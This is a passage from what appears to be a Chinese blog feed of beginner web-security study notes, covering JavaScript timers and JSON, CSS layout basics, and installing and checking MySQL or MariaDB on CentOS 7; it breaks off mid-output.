class="token punctuation">}</span>    var obj<span class="token operator">=</span>setInterval<span class="token punctuation">(</span><span class="token string">'setTime()'</span>,<span class="token string">'500'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        clearInterval<span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>只执行一次</p><p>setTimeout()<br>clearTimeout()</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"status"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"删除"</span> onclick<span class="token operator">=</span><span class="token string">"Delele();"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> Delele<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span>.innerText<span class="token operator">=</span><span class="token string">"已删除"</span><span class="token punctuation">;</span>        setTimeout<span class="token punctuation">(</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            document.getElementById<span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span>.innerText<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>,5000<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>事件</p><p>绑定事件两种方式</p><p>直接标签绑定 直接标签绑定 </p><pre class=" language-bash"><code class="language-bash">onclick<span class="token operator">=</span><span class="token string">''</span></code></pre><p>先获取 dom 对象，然后进行绑定</p><pre class=" language-bash"><code class="language-bash">document.getElementById<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">)</span>.onclick<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="0x017-JavaScript-序列化和反序列化"><a href="#0x017-JavaScript-序列化和反序列化" class="headerlink" title="0x017 JavaScript 序列化和反序列化"></a>0x017 JavaScript 序列化和反序列化</h3><hr><p><code>Json</code> 与字符串的转换</p><p>把对象转为字符串</p><pre class=" language-bash"><code class="language-bash">JSON.stringify<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>把字符串转为数组</p><pre class=" language-bash"><code class="language-bash">newli <span class="token operator">=</span> JSON.parse<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>序列化 即 <code>js</code> 中的 <code>Object</code> 转化为字符串</p><p>使用 <code>toJSONString</code></p><pre class=" language-bash"><code class="language-bash">var last<span class="token operator">=</span>obj.toJSONString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //将 JSON 对象转化为 JSON 字符</code></pre><p>使用 <code>stringify</code></p><pre class=" language-bash"><code class="language-bash">var last<span class="token operator">=</span>JSON.stringify<span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> //将 JSON 对象转化为 JSON 字符</code></pre><p>反序列化 即 <code>js</code> 中 <code>JSON</code> 字符串转化为 <code>Object</code></p><hr><h3 id="0x018-其他教程"><a href="#0x018-其他教程" class="headerlink" title="0x018 其他教程"></a>0x018 其他教程</h3><hr><p><a href="https://www.runoob.com/js/js-tutorial.html">菜鸟教程</a><br><a href="https://www.w3school.com.cn/jsref/index.asp">JavaScript参考手册(附带实验环境)</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> Web Security </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全DIV+CSS基础</title>
      <link href="/2022/08/09/toc-heading-4/"/>
      <url>/2022/08/09/toc-heading-4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-DIV-CSS-介绍"><a href="#0x001-DIV-CSS-介绍" class="headerlink" title="0x001 DIV+CSS 介绍"></a>0x001 DIV+CSS 介绍</h3><hr><p>层叠样式表(英文全称：<code>Cascading Style Sheets</code>)是一种用来表现 <code>HTML</code>（标准通用<br>标记语言的一个应用）或 <code>XML</code>（标准通用标记语言的一个子集）等文件样式的<br>计算机语言。<code>CSS</code> 不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对<br>网页各元素进行格式化。<br><code>CSS</code> 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体<br>字号样式，拥有对网页对象和模型样式编辑的能力。</p><p><code>DIV</code> 是 <code>html</code> 的一个标签 <code>css</code> 是一个样式表</p><p>注释：/**/</p><hr><h3 id="0x002-样式列表"><a href="#0x002-样式列表" class="headerlink" title="0x002 样式列表"></a>0x002 样式列表</h3><hr><h4 id="1-嵌入式列表"><a href="#1-嵌入式列表" class="headerlink" title="1.嵌入式列表"></a>1.嵌入式列表</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span>/title<span class="token operator">></span>        <span class="token operator">&lt;</span>style<span class="token operator">></span>            .demo1<span class="token punctuation">{</span>                color: red<span class="token punctuation">;</span>                width: 100px:                height: 100px<span class="token punctuation">;</span>                background: blue<span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token operator">&lt;</span>/style<span class="token operator">></span>    <span class="token operator">&lt;</span>/head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"demo1"</span><span class="token operator">></span>            demo1        <span class="token operator">&lt;</span>/div<span class="token operator">></span>    <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><h4 id="2-外部样式"><a href="#2-外部样式" class="headerlink" title="2.外部样式"></a>2.外部样式</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string">"stylesheet"</span> href<span class="token operator">=</span><span class="token string">"css/style.css"</span>/<span class="token operator">></span></code></pre><p>在 <code>css/style.css</code> 文件中添加如下代码</p><pre class=" language-bash"><code class="language-bash">@import url@import url<span class="token punctuation">(</span><span class="token string">"g.css"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>.demo1<span class="token punctuation">{</span>    color: red    width: 100px<span class="token punctuation">;</span>    height: 100px<span class="token punctuation">;</span>    background: nlue<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="3-内联样式"><a href="#3-内联样式" class="headerlink" title="3.内联样式"></a>3.内联样式</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div color: red,width: 100px,height: 100px,background: blue<span class="token operator">></span>demo1<span class="token operator">&lt;</span>/div<span class="token operator">></span></code></pre><hr><h3 id="0x003-样式选择器"><a href="#0x003-样式选择器" class="headerlink" title="0x003 样式选择器"></a>0x003 样式选择器</h3><hr><ul><li>元素选择器 div{属性:值}</li><li>ID 选择器 #id{属性:值}</li><li>class 选择器 .类名{属性:值}</li><li>子选择器 元数 空格 元素{属性:值}</li><li>后代选择器 元数 &gt; 元数{属性:值}</li><li>属性选择器 元素[属性]{}</li><li>通配符选择器 *{属性:值}</li><li>群组选择器</li></ul><hr><h3 id="0x004-背景"><a href="#0x004-背景" class="headerlink" title="0x004 背景"></a>0x004 背景</h3><hr><p>CSS 属性定义背景效果:</p><ul><li>background-color 规定要使用的背景颜色。</li><li>background-position 规定背景图像的位置。</li><li>background-size 规定背景图片的尺寸。</li><li>background-repeat 规定如何重复背景图像。</li><li>background-origin 规定背景图片的定位区域。</li><li>background-clip 规定背景的绘制区域。</li></ul><p>CSS 属性定义背景位置：</p><ul><li>repeat 默认。背景图像将在垂直方向和水平方向重复。</li><li>repeat-x 背景图像将在水平方向重复。</li><li>repeat-y 背景图像将在垂直方向重复。</li><li>no-repeat 背景图像将仅显示一次。</li><li>inherit 规定应该从父元素继承 background-repeat 属性的设置。</li><li>background-attachment 规定背景图像是否固定或者随着页面的其余部分滚动。</li><li>background-image 规定要使用的背景图像。</li></ul><p>inherit 可以继承的参数：</p><ul><li>left top</li><li>left center</li><li>left bottom</li><li>right top</li><li>right center</li><li>right bottom</li><li>center top</li><li>center center</li><li>center bottom</li></ul><p>简写</p><pre class=" language-bash"><code class="language-bash">background: url<span class="token punctuation">(</span>images/bg.gif<span class="token punctuation">)</span> no-repeat <span class="token function">top</span> right</code></pre><p>背景图片的滚动</p><p>背景图片是否随着内容的滚动而滚动由 background-attachment 设置</p><ul><li>background-attachment:fixed; 固定，不随内容的滚动而滚动</li><li>background-attachment:scroll; 滚动，随内容的滚动而滚动</li></ul><hr><h3 id="0x005-边框"><a href="#0x005-边框" class="headerlink" title="0x005 边框"></a>0x005 边框</h3><hr><p>边框颜色 border-color:#000</p><p>边框宽度 border-width:1px;</p><ul><li>border-left 设置左边框，一般单独设置左边框样式使用</li><li>border-right 设置右边框，一般单独设置右边框样式使用</li><li>border-top 设置上边框，一般单独设置上边框样式使用</li><li>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为 css 下划线效果应用。</li></ul><p>边框样式值如下：</p><ul><li>none : 无边框。与任何指定的 border-width 值无关</li><li>hidden : 隐藏边框。IE 不支持</li><li>dotted : 在 MAC 平台上 IE4+与 WINDOWS 和 UNIX 平台上 IE5.5+为点线。否则为实线（常用）</li><li>dashed : 在 MAC 平台上 IE4+与 WINDOWS 和 UNIX 平台上 IE5.5+为虚线。否则为实线（常用）</li><li>solid : 实线边框（常用）</li><li>double : 双线边框。两条单线与其间隔的和等于指定的 border-width 值</li></ul><p>上 右 下 左</p><ul><li>groove : 根据 border-color 的值画 3D 凹槽</li><li>ridge : 根据 border-color 的值画菱形边框</li><li>inset : 根据 border-color 的值画 3D 凹边</li><li>outset : 根据 border-color 的值画 3D 凸边</li></ul><p>上 右 下 左 简写</p><pre class=" language-bash"><code class="language-bash">border:5px solid red<span class="token punctuation">;</span></code></pre><p><strong>Border 边框</strong></p><p>常见的写法 </p><pre class=" language-bash"><code class="language-bash">border:1px solid <span class="token comment" spellcheck="true">#foo;</span></code></pre><p>单独属性:</p><ul><li>border-widh:</li><li>border-style:</li><li>dotted 点状虚线</li><li>dashed（虚线）</li><li>solid（实线）</li><li>double（双实线）</li><li>border-color(颜色)</li></ul><hr><h3 id="0x006-属性"><a href="#0x006-属性" class="headerlink" title="0x006 属性"></a>0x006 属性</h3><hr><h4 id="1-文字属性"><a href="#1-文字属性" class="headerlink" title="1.文字属性"></a>1.文字属性</h4><ul><li>color:red; 文字颜色 #ffeeees</li><li>font-size:12px; 文字大小</li><li>font-weight:bolds 文字粗细(bold/normal)</li><li>font-family:”宋体”文字字体</li><li>font-variant:small-caps 小写字母以大写字母显示</li></ul><h4 id="2-文本属性"><a href="#2-文本属性" class="headerlink" title="2.文本属性"></a>2.文本属性</h4><ul><li>text-align:center; 文本对齐(right/left/center)</li><li>line-height:10px; 行间距(可通过它实现文本的垂直居中)</li><li>text-indent:20px; 首行缩进</li><li>text-decoration:none;</li><li>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</li><li>letter-spacing: 字间距</li></ul><hr><h3 id="0x007-列表"><a href="#0x007-列表" class="headerlink" title="0x007 列表"></a>0x007 列表</h3><hr><ul><li>list-style-type 设置列表项标记的类型。参阅：list-style-type 中可能的值。</li><li>list-style-position 设置在何处放置列表项标记。参阅：list-style-position 中可能的值。</li><li>list-style-image 使用图像来替换列表项的标记。参阅：list-style-image 中可能的值。</li><li>inherit 规定应该从父元素继承 list-style 属性的值</li></ul><p>取值 :disc | circle | square | decimal | decimal-leading-zero | lower-roman | upper-roman | lower-greek | lower-latin | upper-latin | armenian | georgian | lower-alpha | upper-alpha | none | inherit</p><ul><li>disc: 点</li><li>circle: 圆圈</li><li>square: 正方形</li><li>decimal: 数字</li><li>decimal-leading-zero: 十进制数，不足两位的补齐前导 0，例如: 01, 02, 03, …, 98, 99</li><li>lower-roman: 小写罗马文字，例如: i, ii, iii, iv, v, …</li><li>upper-roman: 大写罗马文字，例如: I, II, III, IV, V, …</li><li>lower-greek: 小写希腊字母，例如: α(alpha), β(beta), γ(gamma), …</li><li>lower-latin: 小写拉丁文，例如: a, b, c, … z</li><li>upper-latin: 大写拉丁文，例如: A, B, C, … Z</li><li>armenian: 亚美尼亚数字</li><li>georgian: 乔治亚数字，例如: an, ban, gan, …, he, tan, in, in-an, …</li><li>lower-alpha: 小写拉丁文，例如: a, b, c, … z</li><li>upper-alpha: 大写拉丁文，例如: A, B, C, … Z</li><li>none: 无(取消所有的 list 样式)</li><li>inherit: 继承</li></ul><p>list-style-position </p><p>inside：列表项目标记放置在文本以内，且环绕文本根据标记对齐。</p><p>outside：默认值。保持标记位于文本的左侧。列表项目标记放置在文本以外，且环绕文本<br>不根据标记对齐。</p><p>简写</p><pre class=" language-bash"><code class="language-bash">list-style:square inside url<span class="token punctuation">(</span><span class="token string">'/i/arrow.gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x008-超链接"><a href="#0x008-超链接" class="headerlink" title="0x008 超链接"></a>0x008 超链接</h3><hr><p>格式：</p><pre class=" language-bash"><code class="language-bash">a<span class="token punctuation">{</span>text-decoration: none<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>a:link {color:#FF0000;} /* 未访问的链接 */</li><li>a:visited {color:#00FF00;} /* 已访问的链接 */</li><li>a:hover {color:#FF00FF;} /* 鼠标划过链接 */</li><li>a:active {color:#0000FF;} /* 已选中的链接 */</li></ul><hr><h3 id="0x009-盒子模型"><a href="#0x009-盒子模型" class="headerlink" title="0x009 盒子模型"></a>0x009 盒子模型</h3><hr><p>所有<code>HTML</code>元素可以看作盒子，在<code>CSS</code>中，<code>"box model"</code>这一术语是用来设计和布局时使用。</p><p><code>CSS</code>盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。</p><p>盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。</p><p>如下图：</p><p><img src="https://www.runoob.com/images/box-model.gif" alt="盒子模型"></p><p><strong>盒子模型的组成部分：</strong></p><ul><li>Margin(外边距) - 清除边框外的区域，外边距是透明的。</li><li>Border(边框) - 围绕在内边距和内容外的边框。</li><li>Padding(内边距) - 清除内容周围的区域，内边距是透明的。</li><li>Content(内容) - 盒子的内容，显示文本和图像。</li></ul><p><strong>属性：</strong></p><ul><li>自身的身高 width height </li><li>内边距 padding</li><li>盒子边框 border</li><li>与其他盒子的距离 margin 外边距</li></ul><p><strong>元素的宽度和高度</strong></p><p>最终元素的总宽度计算公式是这样的：</p><p>总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距</p><p>元素的总高度最终计算公式是这样的：</p><p>总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距</p><hr><h3 id="0x010-margin-amp-padding"><a href="#0x010-margin-amp-padding" class="headerlink" title="0x010 margin &amp; padding"></a>0x010 margin &amp; padding</h3><hr><h4 id="1-margin-外边距"><a href="#1-margin-外边距" class="headerlink" title="1.margin(外边距)"></a>1.margin(外边距)</h4><p><code>margin</code> 清除周围的（外边框）元素区域。<code>margin</code> 没有背景颜色，是完全透明的。</p><p><code>margin</code> 可以单独改变元素的上，下，左，右边距，也可以一次改变所有的属性。</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/08/VlwVi.png" alt="margin图解"></p><p>可能的值</p><ul><li>auto设置浏览器边距。这样做的结果会依赖于浏览器</li><li>length定义一个固定的margin（使用像素，pt，em等）</li><li>%定义一个使用百分比的边距</li></ul><p>Margin - 单边外边距属性</p><pre class=" language-bash"><code class="language-bash">margin-top:100px<span class="token punctuation">;</span>margin-bottom:100px<span class="token punctuation">;</span>margin-right:50px<span class="token punctuation">;</span>margin-left:50px<span class="token punctuation">;</span></code></pre><p>简写</p><pre class=" language-bash"><code class="language-bash">margin:100px 50px<span class="token punctuation">;</span></code></pre><h4 id="2-padding-填充"><a href="#2-padding-填充" class="headerlink" title="2.padding(填充)"></a>2.padding(填充)</h4><p>当元素的 <code>padding</code>（填充）内边距被清除时，所释放的区域将会受到元素背景颜色的填充。</p><p>单独使用 <code>padding</code> 属性可以改变上下左右的填充。</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/08/VlwVi.png" alt="padding图解"></p><p>可能的值：</p><ul><li>length定义一个固定的填充(像素, pt, em,等)</li><li>%使用百分比值定义一个填充</li></ul><p>padding- 单边内边距属性</p><pre class=" language-bash"><code class="language-bash">padding-top:25px<span class="token punctuation">;</span>padding-bottom:25px<span class="token punctuation">;</span>padding-right:50px<span class="token punctuation">;</span>padding-left:50px<span class="token punctuation">;</span></code></pre><p>简写</p><pre class=" language-bash"><code class="language-bash">padding:25px 50px<span class="token punctuation">;</span></code></pre><blockquote><p>由此可以看出，margin 和 padding 的值和属性是一样的</p></blockquote><hr><h3 id="0x011-Float-浮动"><a href="#0x011-Float-浮动" class="headerlink" title="0x011 Float(浮动)"></a>0x011 Float(浮动)</h3><hr><ul><li>left 元素向左浮动。</li><li>right 元素向右浮动</li></ul><p>清除浮动</p><pre class=" language-bash"><code class="language-bash">clear: both<span class="token punctuation">;</span></code></pre><hr><h3 id="0x012-块级元素、行内元素"><a href="#0x012-块级元素、行内元素" class="headerlink" title="0x012 块级元素、行内元素"></a>0x012 块级元素、行内元素</h3><hr><h4 id="1-块级元素："><a href="#1-块级元素：" class="headerlink" title="1.块级元素："></a>1.块级元素：</h4><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置 <code>width</code>、<code>height</code> 属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置 <code>margin</code>、<code>padding</code> 属性；</p><ul><li>address 地址</li><li>center 举中对齐块</li><li>div- 常用块级容易</li><li>dl 定义列表</li><li>form 交互表单 （只能用来容纳其它块元素）</li><li>h 标签</li><li>hr 水平分隔线</li><li>ol 无需列表</li><li>ul 有序列表</li><li>p 段落</li><li>pre 格式化文本</li></ul><h4 id="2-行内元素："><a href="#2-行内元素：" class="headerlink" title="2.行内元素："></a>2.行内元素：</h4><p>行内元素不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的 <code>width</code>、<code>height</code> 属性则无效；</p><p>行内元素的 <code>margin</code>、<code>padding</code> 属性很奇怪，水平方向的 <code>padding-left</code>、<code>padding-rigtht</code>、<code>margin-left</code>、<code>padding-right</code> 都会产生边距效果，但是竖直方向的 <code>padding-top</code>、<code>padding-bottom</code>、<code>margin-top</code>、<code>margin-bottom</code> 却不产生边距效果。</p><ul><li>a - 锚点</li><li>b - 粗体(不推荐)</li><li>br- 换行</li><li>code - 计算机代码(在引用源码的时候需要)</li><li>em - 强调</li><li>i - 斜体</li><li>img - 图片（特殊的内联元素，同时是内联替换元素，替换元素可以设置宽高）当图片和 DIV 在一起时，图片周围会出现 margin 现象，即元素不重合贴在一起，为了解决这个问题，设置 img 的 css 为{margin：0；display：block；border：0px}</li><li>input - 输入框</li><li>label - 表格标签</li><li>select - 项目选择</li><li>strong - 粗体强调</li><li>textarea - 多行文本输入框</li><li>u - 下划线</li><li>var - 定义变量</li></ul><p>替换元素有如下：（和 img 一样的设置方法）</p><p><code>&lt;img&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;object&gt;</code>都是替换元素，这些元素都没有实际的内容</p><p><strong>行内元素转换</strong></p><ul><li>display:none; 不显示</li><li>display:block;变成块级元素</li><li>display:inline; 变成行内元素</li><li>display:inline-block;以块级元素样式展示，以行级元素样式排列</li></ul><hr><h3 id="0x013-溢出"><a href="#0x013-溢出" class="headerlink" title="0x013 溢出"></a>0x013 溢出</h3><hr><ul><li>overflow 属性规定当内容溢出元素框时发生的事情。</li><li>visible 默认值。内容不会被修剪，会呈现在元素框之外。</li><li>hidden 内容会被修剪，并且其余内容是不可见的。</li><li>scroll 内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。</li><li>auto如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。</li><li>inherit 规定应该从父元素继承 overflow 属性的值。</li></ul><hr><h3 id="0x014-Position-定位"><a href="#0x014-Position-定位" class="headerlink" title="0x014 Position(定位)"></a>0x014 Position(定位)</h3><hr><p>static 静态定位（不对它的位置进行改变，在哪里就在那里）</p><p>默认值。没有定位，元素出现在正常的流中（忽略 <code>top</code>,<code>bottom</code>,<code>left</code>,<code>right</code> 或者<br><code>z-index</code> 声明）。</p><p>fixed 固定定位（参照物–浏览器窗口）—做弹窗广告用到</p><p>生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 <code>left</code>, <code>top</code>, <code>right</code>以及 <code>bottom</code>属性进行规定。</p><p>relative（相对定位 ）（参照物以他本身）</p><p>生成相对定位的元素，相对于其正常位置进行定位。</p><p>absolute（绝对定位）(除了 <code>static</code> 都可以，找到参照物–&gt;与它最近的已经有定位的父元素进行定位)</p><p>生成绝对定位的元素，相对于 <code>static</code> 定位以外的第一个父元素进行定位。</p><p>元素的位置通过 <code>left</code>, <code>top</code>, <code>right</code> 以及 <code>bottom</code> 属性进行规定</p><p>z-index</p><p>z-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。</p><p>定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</p><hr><h3 id="0x015-更多详细教程"><a href="#0x015-更多详细教程" class="headerlink" title="0x015 更多详细教程"></a>0x015 更多详细教程</h3><hr><p><a href="https://www.runoob.com/css/css-tutorial.html">菜鸟教程</a><br><a href="https://www.w3school.com.cn/css/index.asp">W3school教程(可以在线进行实验)</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> Web Security </tag>
            
            <tag> DIV+CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全MySQL基础</title>
      <link href="/2022/08/08/toc-heading-3/"/>
      <url>/2022/08/08/toc-heading-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-MySQL-简介"><a href="#0x001-MySQL-简介" class="headerlink" title="0x001 MySQL 简介"></a>0x001 MySQL 简介</h3><hr><p><strong>什么是数据库？</strong><br>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。</p><p>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</p><p>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><p>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：</p><ul><li>数据以表格的形式出现</li><li>每行为各种记录名称</li><li>每列为记录名称所对应的数据域</li><li>许多的行和列组成一张表单</li><li>若干的表单组成database</li></ul><hr><h3 id="0x002-MySQL-安装"><a href="#0x002-MySQL-安装" class="headerlink" title="0x002 MySQL 安装"></a>0x002 MySQL 安装</h3><p>所有平台的 MySQL 下载地址为： <a href="https://dev.mysql.com/downloads/mysql/">MySQL 下载</a> 。 挑选你需要的 MySQL Community Server 版本及对应的平台。</p><blockquote><p>注意：安装过程我们需要通过开启管理员权限来安装，否则会由于权限不足导致无法安装。</p></blockquote><p>Linux/UNIX 上安装 MySQL<br>Linux平台上推荐使用RPM包来安装Mysql,MySQL AB提供了以下RPM包的下载地址：</p><ul><li>MySQL - MySQL服务器。你需要该选项，除非你只想连接运行在另一台机器上的MySQL服务器。</li><li>MySQL-client - MySQL 客户端程序，用于连接并操作Mysql服务器。</li><li>MySQL-devel - 库和包含文件，如果你想要编译其它MySQL客户端，例如Perl模块，则需要安装该RPM包。</li><li>MySQL-shared - 该软件包包含某些语言和应用程序需要动态装载的共享库(libmysqlclient.so*)，使用MySQL。</li><li>MySQL-bench - MySQL数据库服务器的基准和性能测试工具。</li></ul><p>安装前，我们可以检测系统是否自带安装 MySQL:</p><pre class=" language-bash"><code class="language-bash">rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> mysql</code></pre><p>如果你系统有安装，那可以选择进行卸载:</p><pre class=" language-bash"><code class="language-bash">rpm -e mysql　　// 普通删除模式rpm -e --nodeps mysql　　// 强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除</code></pre><p><strong>安装 MySQL：</strong></p><p>接下来我们在 <code>Centos7</code> 系统下使用 <code>yum</code> 命令安装 <code>MySQL</code>，需要注意的是 <code>CentOS 7</code> 版本中 <code>MySQL</code>数据库已从默认的程序列表中移除，所以在安装前我们需要先去官网下载 <code>Yum</code> 资源包，下载地址为：<a href="https://dev.mysql.com/downloads/repo/yum/">https://dev.mysql.com/downloads/repo/yum/</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpmrpm -ivh mysql-community-release-el7-5.noarch.rpmyum updateyum <span class="token function">install</span> mysql-server</code></pre><p>权限设置：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chown</span> -R mysql:mysql /var/lib/mysql/</code></pre><p>初始化 <code>MySQL</code>：</p><pre class=" language-bash"><code class="language-bash">mysqld --initialize</code></pre><p>启动 <code>MySQL</code>：</p><pre class=" language-bash"><code class="language-bash">systemctl start mysqld</code></pre><p>查看 <code>MySQL</code> 运行状态：</p><pre class=" language-bash"><code class="language-bash">systemctl status mysqld</code></pre><blockquote><p>注意：如果我们是第一次启动 mysql 服务，mysql 服务器首先会进行初始化的配置。</p></blockquote><p>此外,你也可以使用 <code>MariaDB</code> 代替，<code>MariaDB</code> 数据库管理系统是 <code>MySQL</code> 的一个分支，主要由开源社区在维护，采用 <code>GPL</code> 授权许可。开发这个分支的原因之一是：甲骨文公司收购了 <code>MySQL</code> 后，有将 <code>MySQL</code> 闭源的潜在风险，因此社区采用分支的方式来避开这个风险。</p><p><code>MariaDB</code>的目的是完全兼容<code>MySQL</code>，包括<code>API</code>和命令行，使之能轻松成为<code>MySQL</code>的代替品。</p><pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> mariadb-server mariadb</code></pre><p><code>mariadb</code>数据库的相关命令是：</p><pre class=" language-bash"><code class="language-bash">systemctl start mariadb  <span class="token comment" spellcheck="true">#启动MariaDB</span>systemctl stop mariadb  <span class="token comment" spellcheck="true">#停止MariaDB</span>systemctl restart mariadb  <span class="token comment" spellcheck="true">#重启MariaDB</span>systemctl <span class="token function">enable</span> mariadb  <span class="token comment" spellcheck="true">#设置开机启动</span></code></pre><p><strong>验证 MySQL 安装</strong></p><p>在成功安装 <code>MySQL</code> 后，一些基础表会表初始化，在服务器启动后，你可以通过简单的测试来验证 <code>MySQL</code> 是否工作正常。</p><p>使用 <code>mysqladmin</code> 工具来获取服务器状态：</p><p>使用 <code>mysqladmin</code> 命令来检查服务器的版本, 在 <code>linux</code> 上该二进制文件位于 <code>/usr/bin</code> 目录，在 <code>Windows</code> 上该二进制文件位于 <code>C:\mysql\bin</code> 。</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysqladmin --version</span></code></pre><p><code>linux</code>上该命令将输出以下结果，该结果基于你的系统信息：</p><pre class=" language-bash"><code class="language-bash">mysqladmin  Ver 8.23 Distrib 5.0.9-0, <span class="token keyword">for</span> redhat-linux-gnu on i386</code></pre><p>如果以上命令执行后未输出任何信息，说明你的<code>Mysql</code>未安装成功。</p><p>使用 <code>MySQL Client(Mysql客户端)</code> 执行简单的<code>SQL</code>命令</p><p>你可以在 <code>MySQL Client(Mysql客户端)</code> 使用 <code>mysql</code> 命令连接到 <code>MySQL</code> 服务器上，默认情况下 <code>MySQL</code> 服务器的登录密码为空，所以本实例不需要输入密码。</p><p>命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysql</span></code></pre><p>以上命令执行后会输出 <code>mysql&gt;</code>提示符，这说明你已经成功连接到<code>Mysql</code>服务器上，你可以在 <code>mysql&gt;</code> 提示符执行<code>SQL</code>命令：</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SHOW DATABASES<span class="token punctuation">;</span>+----------+<span class="token operator">|</span> Database <span class="token operator">|</span>+----------+<span class="token operator">|</span> mysql    <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">test</span>     <span class="token operator">|</span>+----------+2 rows 